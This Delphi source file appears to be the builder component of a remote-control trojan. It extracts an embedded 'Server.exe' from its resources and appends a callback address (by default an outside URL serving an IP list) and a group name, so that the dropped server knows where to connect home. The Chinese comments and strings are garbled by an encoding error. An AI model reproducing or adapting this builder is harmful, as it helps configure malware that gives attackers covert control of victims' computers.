unit Unit3;
{����BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
Զ�̿��ƺ�ľ���дȺ30096995   }
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls,    IniFiles;

type
  Tserver = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    { Private declarations }
  public
  procedure Setfile1;
    { Public declarations }
  end;

var
  server: Tserver;
  myinifile:Tinifile;      //��������

implementation

{$R *.dfm}
{$R Server.RES}
function GetLength(Text: String): String;
Begin
  If (Length(Text) > 9) Then
    Result := IntToStr(Length(Text))
  Else
    Result := '0'+IntToStr(Length(Text));
End;

procedure Tserver.Setfile1;
var
   i:integer;
   F:File;
   S,temp:string;
   Str,Str1,str2,str3:array [1..100] of char;
begin
   s:=Edit1.Text;
   AssignFile(F,ExtractFilePath(Paramstr(0))+'server.exe');
   Reset(F,1);
   Seek(F,Filesize(F));
   For i:=1 to length(S) do Str[i]:=S[i];
   Blockwrite(F,Str,length(S));
   temp:= GetLength(S);
   For i:=1 to 2 do Str1[i]:=temp[i];
   Blockwrite(F,Str1,2);
   //ProgressBar1.Position :=75 ;   //������
   S:=Edit2.Text;
   For i:=1 to length(S) do Str2[i]:=S[i];
   Blockwrite(F,Str2,length(S));
   temp:= GetLength(S);
   For i:=1 to 2 do Str3[i]:=temp[i];
   Blockwrite(F,Str3,2);
   //ProgressBar1.Position :=90;  //������
   CloseFile(F);
   //ProgressBar1.Position := 0;    //������
   MessageBox(Application.Handle, '������������!', '��ʾ', mb_ok);
end;

procedure Tserver.Button1Click(Sender: TObject);
var
  Res:TRESourceStream;
begin
    //ProgressBar1.Position := 0;    //������
    if FileExists(ExtractFilePath(Paramstr(0))+'Server.exe') then
       DeleteFile(ExtractFilePath(Paramstr(0))+'Server.exe');
    Res:= TRESourceStream.Create(Hinstance,'Server','exefile');
    //ProgressBar1.Position :=20;    //������

    Res.SaveToFile(ExtractFilePath(Paramstr(0))+'Server.exe');
    Res.Free;
    //ProgressBar1.Position :=50;    //������
    Sleep(200);
    if FileExists(ExtractFilePath(Paramstr(0))+'Server.exe') then
        Setfile1;
end;

procedure Tserver.FormCreate(Sender: TObject);
var
  filename:string;
begin
  filename:=ExtractFilePath(paramstr(0))+'alalmn.ini';                                 //��myini.ini�ļ��洢��Ӧ�ó���ǰĿ¼��
  myinifile:=TInifile.Create(filename);                                              //��myini.ini�ļ��洢��Ӧ�ó���ǰĿ¼��
  edit1.Text:= myinifile.readstring('Server','�Զ����ߵ�ַ','http://www.e1058.com/ip.txt');
  edit2.text:= myinifile.readstring('Server','�Զ���������','���ͻ���ר��');
end;

procedure Tserver.FormDestroy(Sender: TObject);
begin
  myinifile.writestring('Server','�Զ����ߵ�ַ',edit1.Text);
  myinifile.writestring('Server','�Զ���������',edit2.text);
  myinifile.Destroy;
end;

end.
